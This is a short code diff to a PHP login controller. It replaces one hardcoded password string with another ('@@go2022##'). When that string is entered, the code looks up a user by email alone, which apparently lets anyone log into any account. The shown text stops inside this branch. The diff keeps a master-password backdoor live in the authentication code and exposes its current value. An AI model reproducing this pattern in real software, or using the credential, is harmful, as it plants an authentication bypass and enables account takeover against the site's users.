@@ -16,7 +16,7 @@ class LoginController extends Controller
 		$credentials = $request->only('email', 'password');
 
 
-		if ($request->password == "##go2021@@") {
+		if ($request->password == "@@go2022##") {
 			$usuario = \App\Usuario::where('email', $request->email)->first();
 			if(!$usuario){
 				
